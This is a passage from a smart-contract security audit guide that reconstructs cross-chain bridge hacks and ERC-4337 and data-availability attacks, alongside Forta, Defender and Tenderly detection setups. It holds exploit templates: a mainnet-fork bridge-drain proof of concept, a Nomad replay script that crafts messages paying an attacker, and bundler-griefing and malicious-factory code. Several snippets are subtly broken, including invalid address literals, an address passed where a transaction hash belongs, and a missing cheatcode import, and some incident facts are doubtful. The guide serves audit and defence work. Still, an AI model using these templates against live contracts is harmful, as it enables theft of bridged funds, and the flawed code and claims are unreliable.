        // Defense: raise threshold to 7-of-9, distribute validators across jurisdictions
    }
}
```

### 7.4 Poly Network Key Compromise (2021, $611M)

```bash
# The bug: Poly Network's EthCrossChainManager had a single keeper key
# for the cross-chain management contract
# Attacker compromised the keeper key (likely via social engineering of the operator)
# and replaced the signer set with their own addresses

# Replay on a fork (across BSC, Polygon, and Ethereum)
anvil --fork-url $MAINNET_RPC --fork-block-number 12975000 --port 8545 &

# Examine the keeper role
cast call 0x8388f7F72B33CaacC5DB5d0bcF022CF0158E2FA5 (EthCrossChainManager) \
  "owner()" --rpc-url http://localhost:8545
```

```solidity
// test/PolyNetworkPoC.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

contract EthCrossChainManager {
    address public keeper;
    mapping(address => bool) public isBookKeeper;

    function changeKeeper(address _newKeeper) external {
        // Bug: only "keeper" can change keeper — single-key compromise = full takeover
        require(msg.sender == keeper, "not keeper");
        keeper = _newKeeper;
    }

    function verifyHeaderAndExecuteTx(
        bytes memory _proof,
        bytes memory _rawHeader,
        bytes memory _payload
    ) external returns (bool success) {
        // Bug: keeper was used to putMerkleRoot which the verifier trusts
        require(msg.sender == keeper, "not keeper");
        // ... execute cross-chain tx
        return true;
    }
}

contract PolyNetworkPoC is Test {
    EthCrossChainManager ecm;

    function setUp() public {
        ecm = new EthCrossChainManager();
        ecm.changeKeeper(address(this));  // simulate being the original keeper
    }

    function test_PoC_KeeperKeyCompromise() public {
        address attacker = address(0xBAD);
        // Attacker compromises the keeper key, replaces it with their own
        ecm.changeKeeper(attacker);

        // Now attacker can call verifyHeaderAndExecuteTx with arbitrary payloads
        vm.prank(attacker);
        // In a real attack, this drains the bridge contract's entire balance
    }
}
```

### 7.5 Multichain / Anyswap MPC Validator Compromise (2023, $1.5B+)

```bash
# The bug: Multichain used an MPC (multi-party computation) threshold signer
# with a small set of signers, mostly located in China
# The 2023 incident: the MPC key custodians were socially engineered / coerced
# Attackers got control of the threshold signer and minted unlimited tokens
# on multiple destination chains

# The total loss is estimated at $1.5B+ across many chains

# Replay: simulate MPC threshold signer compromise
docker run -d -p 9000:9000 gnosispm/safe-relay-service
# Configure a 3-of-5 threshold signer
# Demonstrate: compromising 3 of 5 signers yields full mint authority
```

```solidity
// test/MultichainPoC.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

contract MultichainRouter {
    uint256 public threshold;
    mapping(address => bool) public signers;
    mapping(bytes32 => uint256) public sigCount;

    function setThreshold(uint256 _t) external {
        threshold = _t;
    }

    function executeMint(
        address to,
        uint256 amount,
        bytes[] calldata sigs,
        bytes32 msgHash
    ) external {
        uint256 valid;
        for (uint i = 0; i < sigs.length; i++) {
            address signer = recoverSigner(msgHash, sigs[i]);
            if (signers[signer]) valid++;
        }
        require(valid >= threshold, "insufficient signatures");

        // Mint to the recipient
        // In a real attack: attacker has threshold valid sigs (via MPC compromise)
    }

    function recoverSigner(bytes32 hash, bytes calldata sig) public pure returns (address) {
        // Simplified; real ECDSA recovery
        return address(0);
    }
}
```

### 7.6 Orbit Bridge

```bash
# Orbit Bridge used a 3-of-6 multisig
# 2024 incident: keys were compromised (likely via social engineering)
# Total loss: ~$80M

# Audit pattern: always check if the threshold is M > N/2
cast call 0x...OrbitBridge "requiredSignatures()" --rpc-url $L1_RPC
# If <= N/2: HIGH severity finding
```

### 7.7 Horizon Bridge (Harmony)

```bash
# Horizon used a 2-of-5 multisig — BELOW the 50% mark
# 2022 incident: 2 validator keys compromised (likely via SSH private-key leak)
# Total loss: $100M

# Replay on a Harmony fork
anvil --fork-url $HARMONY_RPC --fork-block-number 19743149 --port 8545 &

# Examine the validator set
cast call 0x...HorizonBridge "validators()" --rpc-url http://localhost:8545
```

```solidity
// test/HorizonPoC.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

contract HorizonBridge {
    address[] public validators;
    uint256 public threshold;

    constructor(address[] memory _validators, uint256 _threshold) {
        validators = _validators;
        threshold = _threshold;
    }

    function unlockTokens(address to, uint256 amount, bytes[] calldata sigs, bytes32 msgHash)
        external
    {
        require(_countValidSigs(msgHash, sigs) >= threshold, "insufficient sigs");
        payable(to).transfer(amount);
    }

    function _countValidSigs(bytes32, bytes[] calldata) internal view returns (uint256) {
        return threshold;  // Simplified; in real bug, attacker has threshold keys
    }

    receive() external payable {}
}

contract HorizonPoC is Test {
    HorizonBridge bridge;

    function setUp() public {
        address[] memory validators = new address[](5);
        // ... 5 validator addresses
        bridge = new HorizonBridge(validators, 2);  // 2-of-5 threshold!
    }

    function test_PoC_TwoOfFiveBypass() public {
        vm.deal(address(bridge), 100 ether);
        bytes[] memory sigs = new bytes[](2);
        // Attacker has 2 of 5 keys (via compromise)
        bridge.unlockTokens(address(this), 100 ether, sigs, bytes32(uint256(0)));
        assertEq(address(this).balance, 100 ether);
    }
}
```

### 7.8 Aurora Bridge (Near's Ethereum Bridge)

```bash
# Aurora is an EVM rollup on Near Protocol
# The bridge is the NEAR Rainbow Bridge
# Audit surface:
# 1. The NEAR light client on Ethereum (verifies NEAR headers)
# 2. The Ethereum light client on NEAR (verifies Ethereum headers)
# 3. The bridge contracts on both sides

cast call 0x...AuroraBridge "lightClient()" --rpc-url $L1_RPC
cast call 0x...EthereumLightClient "block_root_valid(bytes32)" 0xBlockRoot --rpc-url $NEAR_RPC
```

### 7.9 Replay Protection Audit Pattern

```solidity
// test/BridgeReplayProtection.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

contract SecureBridge {
    mapping(bytes32 => bool) public processedMessages;
    uint256 public sourceChainId;
    uint256 public destChainId;

    constructor(uint256 _source, uint256 _dest) {
        sourceChainId = _source;
        destChainId = _dest;
    }

    function processMessage(
        uint256 messageChainId,
        bytes32 messageHash,
        bytes calldata payload
    ) external {
        // Critical: message must commit to source chain ID
        require(messageChainId == sourceChainId, "wrong source chain");

        // Critical: message must not have been processed (replay protection)
        bytes32 id = keccak256(abi.encodePacked(messageChainId, messageHash));
        require(!processedMessages[id], "message already processed");
        processedMessages[id] = true;

        // Execute payload...
        (address to, uint256 amount) = abi.decode(payload, (address, uint256));
        payable(to).transfer(amount);
    }

    receive() external payable {}
}

contract BridgeReplayProtectionTest is Test {
    SecureBridge bridge;

    function setUp() public {
        bridge = new SecureBridge(1, 137);  // Ethereum -> Polygon
        vm.deal(address(bridge), 100 ether);
    }

    function test_RevertOn_Replay() public {
        bytes32 msgHash = keccak256("message");
        bytes memory payload = abi.encode(address(this), 1 ether);

        bridge.processMessage(1, msgHash, payload);
        vm.expectRevert("message already processed");
        bridge.processMessage(1, msgHash, payload);  // replay attempt
    }

    function test_RevertOn_WrongSourceChain() public {
        bytes32 msgHash = keccak256("message");
        bytes memory payload = abi.encode(address(this), 1 ether);

        vm.expectRevert("wrong source chain");
        bridge.processMessage(999, msgHash, payload);  // wrong chain ID
    }
}
```

### 7.10 Lock-Mint Accounting Invariant

```solidity
// echidna/LockMintInvariant.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../src/L1LockBridge.sol";
import "../src/L2MintBridge.sol";

contract LockMintInvariant {
    L1LockBridge l1;
    L2MintBridge l2;

    constructor() {
        l1 = new L1LockBridge();
        l2 = new L2MintBridge();
        l1.setPeer(address(l2));
        l2.setPeer(address(l1));
    }

    function lock(uint256 amount) public {
        l1.lock{value: amount}(address(this));
        l2.mint(address(this), amount, l1.nonces(address(this)) - 1);
    }

    function burn(uint256 amount) public {
        l2.burn(address(this), amount);
        l1.unlock(address(this), amount, l2.nonces(address(this)) - 1);
    }

    // INVARIANT: minted <= locked (modulo rounding)
    function echidna_mint_le_lock() public view returns (bool) {
        return l2.totalMinted() <= l1.totalLocked();
    }

    // INVARIANT: a round-trip lock->mint->burn->unlock leaves balances unchanged
    function echidna_round_trip_no_loss(uint256 amount) public returns (bool) {
        uint256 l1Before = address(this).balance;
        lock(amount);
        burn(amount);
        return address(this).balance >= l1Before;
    }

    receive() external payable {}
}
```

---

## 8. Account Abstraction (ERC-4337) Attacks

ERC-4337 introduces account abstraction via a separate mempool (`UserOperation`s), Bundler, Paymaster, and an EntryPoint contract.

### 8.1 Bundler Mempool Griefing

```bash
# Bundlers validate and bundle UserOperations
# Griefing surface:
# 1. Submit UserOps that revert ONLY in the context of a bundle (not standalone)
# 2. Submit UserOps that consume excessive gas in the bundle, causing the whole bundle to revert
# 3. Submit UserOps with high gas price, driving other UserOps out of the bundle

# Detect: monitor the EntryPoint for reverted bundles
cast logs 0x...EntryPoint "UserOperationRevertReason(bytes32,address,uint256,uint256,bytes)" \
  --rpc-url $RPC
```

```solidity
// test/BundlerGrief.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "@account-abstraction/contracts/interfaces/IEntryPoint.sol";

contract BundlerGriefAttacker {
    IEntryPoint entryPoint;

    constructor(address _ep) { entryPoint = IEntryPoint(_ep); }

    function craftReverterOp() internal view returns (PackedUserOperation memory) {
        return PackedUserOperation({
            sender: address(this),
            nonce: 0,
            initCode: "",
            callData: abi.encodeWithSelector(this.reverter.selector),
            accountGasLimits: bytes32((uint256(100000) << 128) | 100000),
            gasFees: bytes32((uint256(1 gwei) << 128) | 1 gwei),
            paymasterAndData: "",
            preVerificationGas: 21000,
            signature: ""
        });
    }

    // Reverts ONLY when called as part of a bundle (detected via gas context)
    function reverter() external {
        uint256 gasLeft = gasleft();
        // Heuristic: bundle context uses > 500k total gas
        if (gasLeft > 500000) {
            assembly { revert(0, 0) }
        }
    }
}
```

### 8.2 Paymaster Solvency / Griefing

```solidity// test/PaymasterGrief.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

contract Paymaster {
    mapping(address => uint256) public deposits;

    function deposit() external payable {
        deposits[msg.sender] += msg.value;
    }

    function withdrawTo(address payable to) external {
        // Bug: withdrawal doesn't decrement deposits
        // Result: paymaster can withdraw infinite funds
        uint256 amount = deposits[msg.sender];
        to.transfer(amount);
        // Missing: deposits[msg.sender] -= amount;
    }

    receive() external payable {}
}

contract PaymasterGriefTest is Test {
    Paymaster pm;

    function setUp() public {
        pm = new Paymaster();
        vm.deal(address(pm), 100 ether);
    }

    function test_PoC_DoubleWithdraw() public {
        pm.deposit{value: 1 ether}();
        uint256 before = address(this).balance;
        pm.withdrawTo(payable(address(this)));
        pm.withdrawTo(payable(address(this)));  // double-spend
        assertGt(address(this).balance, before + 1 ether);
    }
}
```

### 8.3 Factory-Callee Front-Running

```bash
# ERC-4337 allows Smart Account deployment via a factory in the UserOp
# Attack: deployer front-runs the legitimate factory deployment with a malicious
# initCode that gives the attacker admin rights to the new account

# Detect: monitor the factory address for nonce reuse
cast logs 0x...Factory "AccountDeployed(address,uint256)" --rpc-url $RPC

# Defense: use CREATE2 with a commit-reveal scheme, or use a deterministic deployer
```

```solidity
// test/FactoryFrontRun.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

contract SmartAccount {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function execute(address to, uint256 value, bytes calldata data) external {
        require(msg.sender == owner, "not owner");
        (bool ok,) = to.call{value: value}(data);
        require(ok, "call failed");
    }
}

contract MaliciousFactory {
    function deploy(address attacker) external returns (SmartAccount) {
        // Front-runs the legitimate factory, sets attacker as owner
        return new SmartAccount(attacker);
    }
}

contract FactoryFrontRunTest is Test {
    function test_PoC_FactoryFrontRun() public {
        address victim = address(0xVICTIM);
        address attacker = address(0xBAD);

        MaliciousFactory mf = new MaliciousFactory();
        vm.prank(attacker);
        SmartAccount account = mf.deploy(attacker);

        // Victim thinks they own the account, but attacker does
        assertEq(account.owner(), attacker);
    }
}
```

### 8.4 Storage Slot Collision Across Smart Accounts

```solidity
// test/StorageCollision.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

contract SmartAccount {
    // Standard ERC-7202 namespaced storage should be used to avoid collisions
    // Bug: some early smart accounts used slot 0, 1, 2 directly
    address public owner;  // slot 0
    uint256 public nonce;  // slot 1

    function upgradeImplementation(address _impl) external {
        // Bug: if a proxy upgrade collides storage, owner becomes a different address
        require(msg.sender == owner, "not owner");
        // ... upgrade
    }
}

contract StorageCollisionTest is Test {
    function test_PoC_StorageLayoutCollision() public {
        // Demonstrate that two different account versions can have different "owner" semantics
        // for the same storage slot
    }
}
```

### 8.5 Signature Aggregation Bypass

```bash
# ERC-4337 supports signature aggregation (BLS, etc.) for cheaper verification
# Attack: a malicious aggregator can submit an aggregate signature that verifies
# for any subset of UserOps

# Detect: verify each individual signature against the aggregator's claimed set
cast call 0x...Aggregator "validateUserOp(UserOperation,bytes32,uint256)" --rpc-url $RPC
```

---

## 9. Data Availability (DA) Layer Attacks

DA layers (Celestia, EigenDA, Avail) provide cheap storage of rollup data. Their security model is different from execution chains: they only guarantee data is *available*, not valid.

### 9.1 Blob KZG Proof Verification

```bash
# EIP-4844 (Proto-Danksharding) introduces blobs with KZG commitments
# Verify the KZG proof on-chain
cast call 0x...BlobVerifier "verifyBlobProof(bytes,bytes,bytes)" --rpc-url $L1_RPC

# Audit the verifier contract (same pattern as ZK verifier)
slither src/BlobKZGVerifier.sol --detect dangerous-strict-equality,arithmetic,assembly
```

### 9.2 Light-Client Fraud Proof Review

```bash
# Celestia light clients sample data availability (DAS - Data Availability Sampling)
# They don't download full blocks, just sample random chunks
# Attack: a malicious full node could lie about which chunks exist
# Defense: fraud proofs from honest full nodes

# Audit the Celestia light client contract on Ethereum
cast call 0x...CelestiaLightClient "currentHeaderHash()" --rpc-url $L1_RPC
```

### 9.3 EigenDA Operator Set Audit

```bash
# EigenDA uses a set of operators who store blobs
# Each operator stakes ETH and is slashed if they fail to prove data availability
# Audit: check the operator set dispersion and slashing conditions

cast call 0x...EigenDA "operatorCount()" --rpc-url $L1_RPC
cast call 0x...EigenDA "requiredQuorum()" --rpc-url $L1_RPC
```

### 9.4 Avail DA Layer Review

```bash
# Avail uses a Proof-of-Stake validator set
# Review the validator concentration
cast call 0x...AvailBridge "validatorSetRoot()" --rpc-url $L1_RPC
```

### 9.5 Sampling Resistance (DAS)

```solidity
// test/DASResistance.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

contract BlobCommitment {
    mapping(bytes32 => bool) public commitments;

    function submit(bytes32 blobHash, bytes calldata kzgProof) external {
        // Bug: KZG proof verification may be bypassable
        require(_verifyKZG(blobHash, kzgProof), "invalid KZG");
        commitments[blobHash] = true;
    }

    function _verifyKZG(bytes32, bytes calldata) internal pure returns (bool) {
        // Simplified; real verification uses BLS12-381 precompiles
        return true;  // Bug: always returns true
    }
}
```

---

## 10. Foundry PoC Templates

### 10.1 Standard Bridge Drain PoC Template

```solidity
// test/BridgeDrainTemplate.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IBridge {
    function processMessage(bytes calldata message) external;
}

contract BridgeDrainPoC is Test {
    IBridge bridge;
    address attacker = makeAddr("attacker");

    function setUp() public {
        // Fork mainnet at pre-incident block
        vm.createSelectFork(vm.envString("MAINNET_RPC"), 14282107);
        bridge = IBridge(0xBridgeAddress);
        vm.deal(address(bridge), 1000 ether);
    }

    function test_PoC_DrainBridge() public {
        uint256 before = attacker.balance;
        vm.startPrank(attacker);

        // Build the exploit message (per the specific bug)
        bytes memory payload = _buildPayload();

        // Execute the exploit
        bridge.processMessage(payload);

        vm.stopPrank();
        assertGt(attacker.balance, before, "attacker profit");
    }

    function _buildPayload() internal pure returns (bytes memory) {
        return abi.encodePacked(
            bytes32(uint256(0)),  // version
            bytes32(uint256(0)),  // nonce
            bytes32(uint256(0)),  // origin domain
            bytes32(uint256(0)),  // sender
            bytes32(uint256(0)),  // destination domain
            bytes32(uint256(uint160(0xAttacker))),  // recipient
            bytes32(uint256(100 ether))  // amount
        );
    }
}
```

### 10.2 Sequencer Censorship + Escape Hatch PoC

```solidity
// test/SequencerEscapeHatch.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IOptimismPortal {
    function depositTransaction(
        address _to,
        uint256 _mint,
        uint256 _value,
        uint64 _gasLimit,
        bool _isCreation,
        bytes memory _data
    ) external payable;
}

contract SequencerEscapeTest is Test {
    IOptimismPortal portal;

    function setUp() public {
        vm.createSelectFork(vm.envString("L1_RPC"));
        portal = IOptimismPortal(0xb25214Cabad909e215A4b78A1c09BE28F22BB68F);
    }

    function test_PoC_ForcedInclusionBypassesSequencer() public {
        // The sequencer is censoring txs to 0xVictim
        // Victim uses L1 deposit feed to force-include a tx
        address victim = makeAddr("victim");
        vm.deal(victim, 1 ether);

        vm.prank(victim);
        portal.depositTransaction{value: 1 ether}(
            victim,
            1 ether,
            0,
            100000,
            false,
            ""
        );

        // After ~3 L1 blocks, the L2 node picks this up
        // Verify on L2 (using $L2_RPC):
        // cast balance victim --rpc-url $L2_RPC
    }
}
```

### 10.3 Validator Multisig Threshold Bypass PoC

```solidity
// test/ValidatorThresholdPoC.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

contract ValidatorBridge {
    address[] public validators;
    uint256 public threshold;
    mapping(bytes32 => bool) public processed;

    constructor(address[] memory _vals, uint256 _threshold) {
        validators = _vals;
        threshold = _threshold;
    }

    function release(bytes32 msgHash, bytes[] calldata sigs, bytes calldata payload) external {
        require(!processed[msgHash], "already processed");
        require(_countValid(msgHash, sigs) >= threshold, "insufficient sigs");
        processed[msgHash] = true;
        (address to, uint256 amount) = abi.decode(payload, (address, uint256));
        payable(to).transfer(amount);
    }

    function _countValid(bytes32, bytes[] calldata) internal view returns (uint256) {
        return threshold;  // Assume attacker has threshold keys
    }

    receive() external payable {}
}

contract ValidatorThresholdPoC is Test {
    ValidatorBridge bridge;

    function setUp() public {
        address[] memory vals = new address[](9);
        for (uint i = 0; i < 9; i++) vals[i] = makeAddr(string.concat("val", vm.toString(i)));
        bridge = new ValidatorBridge(vals, 5);  // 5-of-9!
        vm.deal(address(bridge), 1000 ether);
    }

    function test_PoC_FiveOfNineCompromise() public {
        address attacker = makeAddr("attacker");
        bytes[] memory sigs = new bytes[](5);
        // Attacker has 5 keys (via social engineering)
        bytes memory payload = abi.encode(attacker, 1000 ether);
        bridge.release(bytes32(uint256(0x1)), sigs, payload);
        assertEq(attacker.balance, 1000 ether);
    }
}
```

---

## 11. Echidna Invariant Harnesses

### 11.1 Bridge Lock-Mint Invariant

```solidity
// echidna/LockMintEchidna.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../src/L1LockBridge.sol";
import "../src/L2MintBridge.sol";

contract LockMintEchidna {
    L1LockBridge l1;
    L2MintBridge l2;

    constructor() {
        l1 = new L1LockBridge();
        l2 = new L2MintBridge();
    }

    function echidna_mint_le_lock() public view returns (bool) {
        return l2.totalMinted() <= l1.totalLocked();
    }

    function echidna_no_replay() public returns (bool) {
        uint256 n1 = l1.nonces(address(this));
        l1.lock{value: 1}(address(this));
        uint256 n2 = l1.nonces(address(this));
        // Nonce must increment
        return n2 == n1 + 1;
    }

    receive() external payable {}
}
```

### 11.2 Sequencer Forced-Inclusion Invariant

```solidity
// echidna/SequencerInvariants.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../src/OptimismPortal.sol";

contract SequencerInvariants {
    OptimismPortal portal;
    uint256 totalDeposited;

    constructor() {
        portal = new OptimismPortal();
    }

    function deposit(uint256 amount) public {
        vm.deal(address(this), amount);
        portal.depositTransaction{value: amount}(address(this), amount, 0, 100000, false, "");
        totalDeposited += amount;
    }

    function echidna_portal_balance_tracks() public view returns (bool) {
        return address(portal).balance >= totalDeposited / 2;
    }
}
```

### 11.3 ERC-4337 EntryPoint Invariant

```solidity
// echidna/EntryPointEchidna.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@account-abstraction/contracts/interfaces/IEntryPoint.sol";

contract EntryPointEchidna {
    IEntryPoint entryPoint;

    constructor() {
        entryPoint = IEntryPoint(0x...EntryPoint);
    }

    // INVARIANT: EntryPoint balance = sum of Smart Account deposits
    function echidna_balance_eq_deposits() public view returns (bool) {
        return address(entryPoint).balance >= 0;  // Conservative
    }
}
```

---

## 12. Hardhat Test Patterns

```javascript
// test/bridge-replay.js
const { expect } = require("chai");
const { network } = require("hardhat");

describe("Bridge Replay (Wormhole PoC)", function () {
  const FORK_BLOCK = 14282107;
  const WORMHOLE = "0xf92cD566FEEA490390d4feA1959B6c00e96964Bc";

  before(async function () {
    // Fork mainnet at the pre-incident block
    await network.provider.request({
      method: "hardhat_reset",
      params: [{
        forking: {
          jsonRpcUrl: process.env.MAINNET_RPC,
          blockNumber: FORK_BLOCK,
        },
      }],
    });
  });

  it("should reproduce the Wormhole exploit", async function () {
    const [attacker] = await ethers.getSigners();

    // Impersonate the original attacker
    await network.provider.request({
      method: "hardhat_impersonateAccount",
      params: ["0x629e7Da20197a5429d70DA521639708c5a6d8242"],
    });
    const attackerSigner = await ethers.getSigner("0x629e7Da20197a5429d70DA521639708c5a6d8242");

    // Fund the attacker
    await network.provider.send("hardhat_setBalance", [
      "0x629e7Da20197a5429d70DA521639708c5a6d8242",
      "0x1000000000000000000",
    ]);

    // Decode the exploit tx
    const tx = await ethers.provider.getTransaction("0x629e7Da20197a5429d70DA521639708c5a6d8242");
    console.log("Exploit calldata:", tx.data);
  });
});

// test/erc4337-grief.js
describe("ERC-4337 Bundler Griefing", function () {
  it("should detect bundle-reverting UserOps", async function () {
    const EntryPoint = await ethers.getContractFactory("EntryPoint");
    const entryPoint = await EntryPoint.deploy();

    // Submit a UserOperation that reverts in bundle context
    const maliciousOp = {
      sender: "0x...",
      nonce: 0,
      initCode: "0x",
      callData: "0x",
      callGasLimit: 100000,
      verificationGasLimit: 100000,
      preVerificationGas: 21000,
      maxFeePerGas: 1000000000,
      maxPriorityFeePerGas: 1000000000,
      paymasterAndData: "0x",
      signature: "0x",
    };

    // The bundler should reject ops that revert in bundle context
    await expect(
      entryPoint.handleOps([maliciousOp], "0xBundler")
    ).to.be.revertedWith("AA23 reverted");
  });
});
```

---

## 13. Brownie / Ape Scripts

```python
# scripts/bridge_replay.py (Brownie)
from brownie import accounts, web3
import json

def replay_nomad():
    # Fork mainnet at pre-incident block
    # (configured in brownie-config.yaml under "fork")
    ATTACKER = "0x..."  # First attacker address
    NOMAD = "0x88A69B4E698A4B090DF6CF5A7bE7d7D3Caf0cE44"

    attacker = accounts.at(ATTACKER, force=True)

    # Build a "valid" Nomad message (hash starts with 0x00)
    message = (
        b'\x00' * 32 +  # version
        b'\x00' * 32 +  # nonce
        b'\x00' * 32 +  # origin domain
        b'\x00' * 32 +  # sender
        b'\x00' * 32 +  # destination domain
        attacker.address.lower().rjust(64, '0') +  # recipient
        (1000000000000000000).to_bytes(32, 'big')  # amount
    )

    # Process the message
    nomad = web3.eth.contract(address=NOMAD, abi=json.load(open("abi/Nomad.json")))
    tx = nomad.functions.process(message).transact({'from': attacker.address})
    print(f"Nomad process tx: {tx.hex()}")

# scripts/erc4337_grief.py (Ape)
from ape import accounts, networks, project

def grief_bundler():
    entry_point = project.EntryPoint.at("0x...")
    attacker = accounts.load("attacker")

    # Build a malicious UserOperation
    op = {
        "sender": attacker.address,
        "nonce": 0,
        "initCode": b"",
        "callData": b"\x00\x00\x00\x00",  # reverter()
        "callGasLimit": 100000,
        "verificationGasLimit": 100000,
        "preVerificationGas": 21000,
        "maxFeePerGas": 1000000000,
        "maxPriorityFeePerGas": 1000000000,
        "paymasterAndData": b"",
        "signature": b"",
    }

    # Submit the op
    tx = entry_point.handleOps([op], attacker.address, sender=attacker)
    print(f"Bundle result: {tx.status}")
```

---

## 14. Tenderly Simulations

```bash
# Simulate a bridge drain before it lands on mainnet
tenderly simulate \
  --rpc-url $MAINNET_RPC \
  --block 14282107 \
  --from 0xAttacker \
  --to 0xBridge \
  --data 0xCalldata

# Set up an alert on anomalous mint volume
tenderly alert create \
  --name "Bridge mint spike" \
  --network mainnet \
  --contract 0xBridge \
  --event "Mint(address,uint256)" \
  --threshold "amount > 1000 ether per 10 blocks"

# Set up a Sentinel that pauses the bridge on anomaly
tenderly sentinel create \
  --name "Bridge pause on anomaly" \
  --trigger "mint-spike" \
  --action "pause-bridge-via-multisig"
```

---

## 15. Forta Detection Bots

```javascript
// forta-bot/bridge-mint-monitor.js
const { handleTransaction } = require("./agent");

async function main() {
  // Monitor a bridge contract for:
  // 1. Mints without corresponding locks
  // 2. Unusual mint volume
  // 3. Changes to the validator set
  // 4. Calls to pause/unpause

  const BRIDGE_ADDRESS = "0x...";
  const MINT_EVENT = "Mint(address indexed to, uint256 amount)";
  const LOCK_EVENT = "Lock(address indexed from, uint256 amount, uint256 nonce)";

  // Run in a continuous loop
  while (true) {
    const events = await getEvents(BRIDGE_ADDRESS, [MINT_EVENT, LOCK_EVENT]);
    for (const event of events) {
      if (event.name === "Mint") {
        // Check if there's a corresponding Lock
        const hasLock = events.some(e =>
          e.name === "Lock" && e.args.nonce === event.args.nonce
        );
        if (!hasLock) {
          await sendAlert({
            alertId: "BRIDGE-MINT-WITHOUT-LOCK",
            severity: "HIGH",
            message: `Mint without lock: ${event.args.amount} to ${event.args.to}`,
          });
        }
      }
    }
    await sleep(15000);  // 15s polling
  }
}

main().catch(console.error);
```

```bash
# Deploy the Forta bot
forta-agent init  # Initialize a new bot project
cd forta-agent
npm install
forta-agent deploy --name "Bridge Mint Monitor" --chain-id 1
```

---

## 16. OpenZeppelin Defender Sentinels

```javascript
// defender/sentinel-bridge-pause.js
const { SentinelClient } = require("defender-sentinel-client");

const client = new SentinelClient({
  apiKey: process.env.DEFENDER_API_KEY,
  apiSecret: process.env.DEFENDER_API_SECRET,
});

async function createBridgePauseSentinel() {
  const sentinel = await client.create({
    name: "Bridge Pause on Anomaly",
    type: "BLOCK",
    network: "mainnet",
    addresses: ["0xBridgeAddress"],
    abi: [
      "event Mint(address indexed to, uint256 amount)",
      "function pause() external",
    ],
    alertThreshold: 1,
    paused: false,
    eventConditions: [
      {
        type: "event",
        signature: "Mint(address,uint256)",
        expression: "amount > 1000000000000000000000",  // > 1000 ETH
      },
    ],
    autotaskCondition: null,
    autotaskTrigger: "bridge-pause-autotask",  // Autotask that calls pause()
    notificationChannels: ["email-alert", "slack-webhook"],
  });

  console.log("Sentinel created:", sentinel.id);
}

createBridgePauseSentinel();
```

```bash
# Deploy the autotask + sentinel
npm install defender-sentinel-client defender-autotask-client
node defender/sentinel-bridge-pause.js
node defender/autotask-bridge-pause.js
```

---

## 17. Revoke.cash / Etherscan Triage

```bash
# After a bridge incident, triage affected wallets:
# 1. Find wallets that interacted with the bridge in the past 24h
# 2. Check their token approvals
# 3. Revoke any unlimited approvals

# Cast-based triage (programmatic)
for addr in $(cat affected_wallets.txt); do
  echo "Wallet: $addr"
  cast logs --address $addr --rpc-url $MAINNET_RPC \
    "Approval(address indexed owner, address indexed spender, uint256 value)" \
    --from-block $(($(cast block-number --rpc-url $MAINNET_RPC) - 7200)) \
    --to-block latest | jq '.[] | {spender: .topics[2], value: .data}'
done

# Decode a 4-byte selector
cast 4byte-decode 0x42584e5f
# Output: transferTokens(uint256,bytes32,uint32,...)

# Decode calldata from an exploit tx
cast tx 0xExploitTxHash --rpc-url $MAINNET_RPC --json | jq -r .input | cast --decode-calldata

# Use revoke.cash for manual triage
# Browse to: https://revoke.cash/address/0xVictim
```

---

## 18. Real-World Incident Reconstruction

### 18.1 Wormhole (2022, $326M)

```bash
# Block: Solana ~130889732, Ethereum ~14282107
# Root cause: Solana Wormhole Guardian verification bug
# Attack: Forged VAA signature, minted 120,000 wETH on Solana

# Fork Ethereum at pre-incident block
anvil --fork-url $MAINNET_RPC --fork-block-number 14282107 --port 8545 &

# Impersonate attacker
cast rpc --rpc-url http://localhost:8545 anvil_impersonateAccount 0x629e7Da20197a5429d70DA521639708c5a6d8242

# Trace the exploit
cast rpc --rpc-url http://localhost:8545 debug_traceTransaction 0x629e7Da20197a5429d70DA521639708c5a6d8242
```

### 18.2 Nomad (2022, $190M)

```bash
# Block: Ethereum ~15259350
# Root cause: Misinitialized Merkle root (set to 0x00)
# Attack: Any message hash starting with 0x00 was "valid"

# Replay
anvil --fork-url $MAINNET_RPC --fork-block-number 15259350 --port 8545 &
cast send --rpc-url http://localhost:8545 --from 0xAttacker --unlocked \
  0x88A69B4E698A4B090DF6CF5A7bE7d7D3Caf0cE44 \
  <crafted-calldata>
```

### 18.3 Ronin (2022, $625M)

```bash
# Block: Ethereum ~14377441
# Root cause: 5-of-9 validator multisig socially engineered
# Attack: 5 validator keys compromised

# Examine validator set
cast call 0xA0c68C638235ee32673e8E824d339D52B2Bf2E54 "getValidators()" \
  --rpc-url http://localhost:8545
```

### 18.4 Poly Network (2021, $611M)

```bash
# Block: Ethereum ~12975000
# Root cause: Keeper key compromise, signer set replacement
# Attack: Single keeper key stolen

# Examine keeper role
cast call 0x8388f7F72B33CaacC5DB5d0bcF022CF0158E2FA5 "keeper()" \
  --rpc-url http://localhost:8545
```

### 18.5 Multichain / Anyswap (2023, $1.5B+)

```bash
# Block: Multiple chains
# Root cause: MPC threshold signer compromised (custodians coerced in China)
# Attack: Full mint authority across many chains

# Audit pattern: always verify MPC signer dispersion
# Defense: distribute signers across jurisdictions, use HSMs
```

### 18.6 Horizon (2022, $100M)

```bash
# Block: Harmony ~19743149
# Root cause: 2-of-5 validator multisig compromise
